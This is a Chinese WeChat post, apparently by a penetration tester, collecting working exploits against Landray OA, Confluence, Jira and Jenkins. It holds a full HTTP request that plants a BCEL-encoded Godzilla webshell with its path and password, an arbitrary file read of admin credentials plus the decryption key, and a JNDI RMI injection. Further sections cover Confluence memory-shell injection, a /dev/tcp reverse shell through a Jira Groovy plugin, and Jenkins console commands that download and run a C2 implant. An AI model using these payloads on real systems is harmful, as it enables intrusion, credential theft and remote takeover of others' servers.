#  漏洞利用记录(蓝凌&Confluence&Jira&Jenkins)

原创 carrypan  [ 安全艺术 ](javascript:void\(0\);)

**安全艺术** ![]()

微信号 AnQuanYiShu2022

功能介绍 安全培训、渗透测试欢迎来聊

____

___发表于_

收录于合集

最近测试攻入内网，碰到了很多漏洞，有些还需要去查找poc利用，比较浪费时间，还是简单记录下，方便后续查找吧，也有很多都是直接工具集成利用的，懒得整理了，有需要的可以公众号私信获取。

 **1、蓝凌OA前台sysSearchMain.do远程命令执行**

直接写入哥斯拉马

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0Content-Length: 6882Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cache-Control: no-cacheContent-Type: application/x-www-form-urlencodedPragma: no-cacheUpgrade-Insecure-Requests: 1Accept-Encoding: gzip  
    var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=<java><void+class%3d"com.sun.org.apache.bcel.internal.util.ClassLoader"><void+method%3d"loadClass"><string>$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$b5X$5bs$db$c6$V$3e$b4$rSV$e88$91$e3$5b$92$sM$da4$ce$c5$WH$8aQ$Y$3bI$F$8a$A$c1$L$q$R$q$40$mmS$dc$E$80$c4$z$E$u$Sl$7fNg$fa$9c$X$b9S$cf$f4$H$f4$P$f5$ad$d3$b3$e0M$92e$3b$cd$b4$f6$I$Ev$cf$9e$3d$e7$3b$d7$dd$7f$fe$fb$ef$ff$A$80$o$fcy$T$de$87$c7Yx$b2$JW$e0$f1$s$7c$N$df$90$c7$b7$h$f0$dbM$d8$Dz$T$w$b0$bf$JU$606$81$85$da$spP$cfB$p$L$cdM$b8$B$8f7$a0$b5$J$f7$80$t$l$H$hpH$7e$8f6$n$H$ed$N$Q$b2$d0$d9$84$3b$84$7b$97$fc$8a$h$m$R$e2$k$99$97$c9C$c9$c2wY$f8$5d$G$ae$3dq$7c$t$fe$s$DW$l$7c$of$60$ad$S$Yf$Gn6$j$df$e4G$9ef$O$3b$aa$e6$e2$c8V3$d0UWT$87$O$f9$9e$P$ae$c5$b6$T$919F$8d$e2z$U$f8U$dd$O$e8J$b5$f98$D$9b$d5$89n$86$b1$T$f8H$b1$e6$a9$8e$9f$81$3b$P$bek$f6$d5$Tu$dbU$7dk$5b$88$87$8eo$3dN$b7U$87$W$92$dd$bad$3a$D$hOtw$n$a4$ee$o$d9$9bg$a8$w$ae$gEH$b4$W$aa$b1MD$b9$84A$$$c4$97X$g$3a$b19$yd$e0$f6$8c$c6$J$b6$PW$e3H$b6$k$d9$a6$ebf$mk$98$3a$a20$cc$c0$bdf4$f2$b7$3d$t$d2$b7$e9$3d$a1$fa$c5$ce$fel$86$f0$9c$R$cd$f6$c8$c0$N$nV$f5AK$NSd$Q$5c$E$40$IFC$ddd$i$82$d4$ed$8b$I$3d$o2$e4$e0$97$f0A$G$de$b88$99$85$df$e7$e0$P$f0$7d$O$fe$I$wZC$8b$ecG$9c$8fR$86C$T$9fY$d0r$a0$83$91$F3$H$c7$60e$c1$ce$81$D$fd$y$Mr$e0$82$97$F$3f$H$B$84$I$e8$r$9af$e0$eeE$8c$e8$91$e3$a6$Kg$a5$w$fd$90$e3$99$i$fc$A$c3$iD$Q$p$dan$609$fe$f7$ae$T$c5$89$Z$3d$eaGa$OF$Q$S$d9O27$febJ$dd$_$ebB$d5$ea$W$db$89$w$95$7c$aef$f7$P$Fn$wO$V$b7$c5r$3br$c7$ed$b7$3a$dd$a4$d5o$db$5c$3f$3aCG$dbz$b1U$e6$7c$d7$d5$Tn$97cxJ$f7$dc$91$92$d0$b1$b2$df$zk$d2Q$be1$a3$Z$9al$x$3cH$e8$be$c62S$3d$a1e$8e$Vw$MV$i$v$b5$96uT$98$m$N$df$d2$K$cc$40$e9$d5w$f5$9a$e8h$ac$db$e7$Y$x8$3f$c7Y$a6$e3$ee$eaEq$8c$ef$81$e9$Mv$8f$7bt$5e$f6$s$a1$9c$d0$fbs$de$ed$G$5b$_$no$ad$t$d0$7d$99$d0$7b$oe$f4$ea$p$ae$c6$e7uVL$9a$5e$dbU$88$9c$5d$3e$92$7b$fc$b4$c1$f2N$b3$b27nV$I$7d$vRP7$83$b5$c2$83$oe$9d$e1$ef$98$bd$b6$x$e5$v$cb$ac$d8$cbw$3d$998Z$a1$8ck$98$R$c7R$a1$99$d0$94$ee$bb$bb$aa$c7$U$e4$9e5$92$8b$f5$92$5ek$9f4$H$7c$a8$b3$b6$ab$3bt$ffP$Km$c3cv$9a$k$9f$98$3d$9a$d2$92$d2$be$da$a3$D$d4i$a4$UDJ$90JS$83eFr$a1$hp$D$86$e9$s$5cxPh$8d$Q$f3$d0$a8$d8$f1$e1$b4$faE$cb$99$8c$94$9en$3d$b7$8f$cf$8f$V$a95$ea$W$c4$3e$d1$5b$u$88$a5n$91v$e5$c4$de$91$93$92$af$f4$da$V$o$bb$9eXa$b3R$a7$dbb$cbi$I$83$VFlk$a4$b0e$W$f7$b2$b5$8a$3dmt$o$ebX$e2m$83$e5$D$aeb3$s$cb$bb$b8O$a8$Vv$yE8$83$z$5b$cak$ecx$97$ab$e5$cb$e8$X$L$cc$88$k$94$w$b5V$3e$c3$e6$H$bc$60w$8cZ$3d$d4$3c$j$f1$hXf$7e$e97$89$d2$3b$b2$O$FzdH$93$e8$A$d7$98$C$3d$c3R$uM$V$J$ed$e7$b9$94$v$94x$F$ed$sK$86$dbf$5d$d4$89$a7$Q$fb$5dM$d8$xs$y$c1$b6$3a$d2Q$7f$94$x4j$83QG$S$a7z$81$f1$95n$3bD$7c$a7F$r$c5$a1$ae$f9$3c$rK$a5$be$oXN$a7$7b$94$e7$d0$9f4$a1$84$3e$d2F$7d$bb$81$fe$i$5e$a9$8fL$9b$de$c4$d5$3c$83R$xV$d8$e8$c4K$99$97$f6$QJ$b1$dck$H$cdA$3dT$uw$84$be$e8$T$7fm$Jc$L$f9$PT$94$5b$_$k$F$88$3b$ce$95$XX$E$ad$8e$i6$fd$f6$89$d8$a3$d1$bf$eb$fb$e8$9bn$a3$82$3eN$fc$b8$d7$ee$ab$95$bd$a0$dd$b3$fb$K$fa$8c$w$95$R$f3n$c8$d5$e2$f2$ca$bf$eb$ae$b1$8f$f6$S$e8$b1$n$d5$p$82$bb$5e$q$ba$90XZb$ec$Q$be$7c$bf$cdh$k$7f$a2$a0$9e$b2$efR$8a$Y$h$i$5b$9f6$E$e4$5d$ab$9f$Y$c5$96un$afZ$bc$88$af$f9$fa$a3$ddU$kPl$ad$s$ba$dc$3eei$be$Yi$fb1$c6$A$da$b5P$b7$f5B$b7$c0$ef$e7$e7kK$9eV$ac$l$c8R$k$f5$aa$ff$m$f7$U$bb$e9$8b$c8$7f$3c$3a$f2$98$a9$d2$91$vb$83N$a1$fe$D$da$9a$e2$aa$o$c6$409$8d$7b$c4w$b1o$g$phSJe$cb$D$e4Cl4$d7EL8g$3c$93$a12$m$f1R$d0$K$b1$8b$f9$60$sGe9$b7$8b$f1$X$ZR$X$f9$ee$F$L$3d$g$dd$e5$7e$e9$k$b3$dc$d3B$3b$a5$7e$80$3e$d7$O$b4$c2Q$c0ys$3a$b1$7d$b2$c4$80$ec$eb$89E$ae$3a$cb$vi$9eX$e5$M$a4Oy$a1m$ce$c8$b5$d2$_$c2$f8q$8d$84$3e$94$bd$d0$95$8bm$92$bbv$89$3d$b8$g$95$e6$n$b9$c0Pr$c1$b2p$cd$8e$5c$Q$c7h$d3$T$cd$a1$5d$b4$d7$$$faO$89$abE$96$3c$c7$f0p$9e$d7$9a$9er$a2$P0$8e$r$cc$p$3e$9f$d7$9cR$ac$f6$f8$3e$fa$r$dd$a5$Q$8f$d5$fe$O$89$f3W$e1N$f4$3b$9b$9b$c8$9a$ff$J$8e$c2R$ff$99$9f$e4$d1$X$89$3es$bf$c4$3c$99$eaC$b0h$a2$P$h$5ey$a8$I$f6$d2$e6$Y$93i$ec$z$e4_$60$8f$beZ$c6$f8$c4$9c$f0$82$fc$d5$e1$d2$f89$eea$dc$d4$c4$E$f1$y$c8$d2$q$aft$5e$QC$ab$ba$b2$88$a1$w$ee$97$c6$d0$w$bf$fdw1$b4$8c$bd$ffW$M$b1m$f7$t$c6$d0$5c$97$9f$XC$L$3d$g$d2r$bfW$d8$7eN$f7$C$db$_$f0$7c$81$ed$H$LY$7f$b6$ed$F$c4v$5e_8$f6$a5$YO$Nig$a4I$ee$U$ebg$e5H$e4$99$95$dd$JV$83$5d$aeZvT$P$ebM$85$5e$caE$ec$b8$88$c7$a6$87$faa$j$m$7e$84$3e$9b$e6$f4$b3$f6$5e$f5$x$eeJ$_$cfp$8dy$$A$fa$8b$f6Z$d0U$MI$f1H$fc$$p$98$f7K$b3$fc$b1$cc$f9$a5E$dfUF$3b$84$9a$af$9c$a8$Y$bf$b8$be$af$V$b0$b6$zs$d7$5c$Pf$R$7fi$bezY$fdIH$fe9$ee$e5$b1$G$b6$b16$ef$y$f2$B$eaG$b9$87$fd$b1Kr$T$fa$f0$on$G$c8$c7$3e$94$e6xW$X$3e$60$e3z$sO$eax$aa7$83$3d$a3$c7$c4$K$a9$bb$8e$3dN1$409$U$ec$r$e4N$7e$a7$91$d6$e7$w$fa$N$c1$Q$f1$ec$c4$a1$e2$ec$FX$f3$b1$ce$93$bc$98$fa$gm$d4$88$P$d5$f3$a4$96s$3em$9b$d2$e4D$96$8e0$d7Q$e5$99$Pc$ff$b2Z3$7d$d9$9a$e6$ccG$e5F$ad$j$a8$bd$d6e$be$3d$f3$j$8a$d0$T$b9$b17$QJ$ed$b9$ac$a4O$u$x$d2$E$f7$88W$ba$fa$3c$da$98$a1H$fd$971$86I$l$a2$b3LB$fc$O$f1J$b0$a7$8eR$9dQ$f7y_$Rb$af$98$f6$pG$bdz$o$f7$dcC$a3$d7$k$e3$l$e9$n$5cYB$9f$c3$f1NQ$a4$O$a5T$deY$7e$f0$5c$ec$3fS$h$d0$ba_$b7$cdn9o$60$8ff$a4$fe$n$da$9a$80$bd$$$b5$f4a$efPX$f4$dd$ad$f0$tc$8au$ed$f9$fa$Q$7bMO$9c$Y$S$T$e9$89m$e3$de$u$ef$R$f6$b2$f2$88$60$80$b9vJ$ce$H$88$e5$beV$uQJ$cf$a6f$fd$U$3f$c6$ef$a92$c3$b5Gz$3e$d2$3f$n$9e$c5$f4$5d$b0$c9$f9$C$e3It$f4E$cd$d9$df$8bH$ff$94$ee$e9$af$ea2$895$d4q$aa$b3e$ec$J$bb$a9$dd$c4$o$f6$85$88$_$89$x$p$7d$c7$kh$k$abm$ec$HIL4jV$b0$c0$92$f0$3b$o$f9$ad$cb$q$e8$97$r$5c$Xq$88$D$fay8$ef$9d_$c9$9f$9c$85$d0$dey$d9_$c4$a45$e1$9d$c1$ec$8c$f1$92$fe$faX$e8$7e$a6$8f$bf$fe$gO$de$97$ld$f1$ecy$f1$y$98$831L$f00$dc$ed0$P$bf$q$87$bc$q$HS8$c9$c1$9f$c8Q$f5$d6$8a$7cy$be$3f$c7$e4$40$eb$9bz$7cn$a8c$PM$d5$c03$b2$3e$g$OM$3f$5e$7c$bf$f5$e0$93$e6E$w$3cY$df$b6$cc$b8$S$e0iw$S$a7$87$fbf$a0$a6$92$de$3fG$7ef$8a$ac$b9t$o$D$d7$5d$7cIG2$f0$d1$83K$ee$k$$$b9I$b8ya$I$95F$89$O$87A$8c$8a$a1$ba$fb$c1$ec2$e3$c3$85$3c$91$89$8a9q$b2$7d$91$G$99$bd$f7r$K$E$r$d5$d60g$97$F$Zx$f79$ae$abY$e4w$efEs$Zx$N9$91K$9a$b9I$W$7c$7c3$de$ee$b6$c9$8dL$ee$ec7$9e$f5$89V$e9$a5$c9yC$y$afM$d6$a3$d0u$d0$94$l_$G$dc$a575$d7$d404$7d4$ed$c3W$60$7d$ee$da$81$5c$f1$c4$c1$e2$s$e5$f6eK$c5$e5$85$L$3d$3a$3e$s$96$bds$a9Pt$G$ee$3e$f8$8e$be$9cC6$bd$Gr$R$9cu$dd$N$o$T$3e$80$x$f0$3e$90$7fW$nC$aeb$f0$fb$c3$f4n$$$83$ff$B$d6$3f$7d$K$99$l$f1$e5$K$fc$K$9f$e4$9e$O$Ha$N$ae$c1$af$f1$z7$p$82$8f$e07$f8$fb1$fe$ad$e1$c8$7bp$j$k$c0$tsV$bb$f8K$a8$ae$3f$83$x$f2S$b8$w$5ddw$j6$f0m$c5$ee$3a$7c$K$9f$9dc$b7$B$9f$a3d$Z$c2$$s$V$b7$bb$863$f6$df$60$ed$U$d6$b7$ae$9dB$b6$f1$e9$vl$9c$c2$f5S$d8$3c$85$d7$9a$cf$m$t$3f$83$h$b8$d9$eb$9fm$dd$3c$857$ae$WN$e1$cd$ad$z$7c$9c$c2$ad$a7$f0Vk$eb6$ff$M$ee$m$c1$dd$af$d6$9e$c1$3d$f9$fe$da$c3S$b8$bf$f5$f6Sx$e7$ab$f5$cf$ef$af$9f$c2$bb$9f$9f$c2$_$fe$Kk$8d$lS$99t8F9$ae$a6R$3f$82$d7$f0$f9$3aJ$7b$T$de$867$e0$J$bc$J$df$c2$W$d4$e0$W$c8$f0$W$7c$P$b7$91$fe$$$ae$b8$D$W$dcO5$fb$Ge$ce$81$E$Pq5$e0$w$O$b6$81B$ceOP$cb$3c$U$Q$87o$91$ae$88cW$91$cf$3b$b0$D$r$d4$5dF$5c$be$c0$b1u$E$91$e0r$e5_p$9c$85$_$R$F$u$a7$m$7e$f5$l$fci$9akK$V$A$A</string><void+method%3d"newInstance"></void></void></void></java>

访问路径/login_listyes.jsp，密码：yes

![](https://gitee.com/fuli009/images/raw/master/public/20230715093333.png)

 **2、 蓝凌OA前台任意文件读取**

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0Content-Length: 60Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cache-Control: no-cacheContent-Type: application/x-www-form-urlencodedPragma: no-cacheUpgrade-Insecure-Requests: 1Accept-Encoding: gzip  
    var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}

![](https://gitee.com/fuli009/images/raw/master/public/20230715093334.png)

解密密码：kmssAdminKey  

![](https://gitee.com/fuli009/images/raw/master/public/20230715093335.png)

后台地址：/admin.do

![](https://gitee.com/fuli009/images/raw/master/public/20230715093336.png)

 **3、蓝凌OA后台JNDI远程命令执行**

###

登录后台

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /admin.do HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: Content-Type: application/x-www-form-urlencodedContent-Length: 69  
    method=testDbConn&datasource=rmi://******:1099/remoteExploit7

![](https://gitee.com/fuli009/images/raw/master/public/20230715093337.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230715093339.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230715093340.png)

 **4、Confluence写入内存马**

直接上工具，利用CVE-2022-26134写入内存马 **  
**

![](https://gitee.com/fuli009/images/raw/master/public/20230715093341.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230715093342.png)

在请求配置中添加如下内容：  

![](https://gitee.com/fuli009/images/raw/master/public/20230715093343.png)

利用后渗透插件，一键添加Confluence管理员账号：  

![](https://gitee.com/fuli009/images/raw/master/public/20230715093344.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230715093345.png)

 **5、Jira getshell**

查看版本信息，路径：/secure/admin/ViewSystemInfo.jspa

![](https://gitee.com/fuli009/images/raw/master/public/20230715093347.png)

下载对应插件版本

  * 

    
    
    https://marketplace.atlassian.com/apps/1218755/mygroovy/version-history

![](https://gitee.com/fuli009/images/raw/master/public/20230715093348.png)

进入插件管理，上传插件，路径：/plugins/servlet/upm

![](https://gitee.com/fuli009/images/raw/master/public/20230715093349.png)

上传后访问，/secure/JMWEGroovyScriptTester.jspa，执行如下命令

  *   *   * 

    
    
    def r = Runtime.getRuntime()def p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ip/port;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()

![](https://gitee.com/fuli009/images/raw/master/public/20230715093350.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230715093352.png)

 **6、Jenkins getshell**

路径：/jenkins/script

![](https://gitee.com/fuli009/images/raw/master/public/20230715093353.png)

  * 

    
    
    println "wget http://ip/c2".execute().text

![](https://gitee.com/fuli009/images/raw/master/public/20230715093354.png)

  * 

    
    
    println "ls -lt".execute().text

![](https://gitee.com/fuli009/images/raw/master/public/20230715093355.png)

  * 

    
    
    println "chmod +x c2".execute().text

![](https://gitee.com/fuli009/images/raw/master/public/20230715093356.png)

  * 

    
    
    println "./c2".execute().text

执行完直接上线cs

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

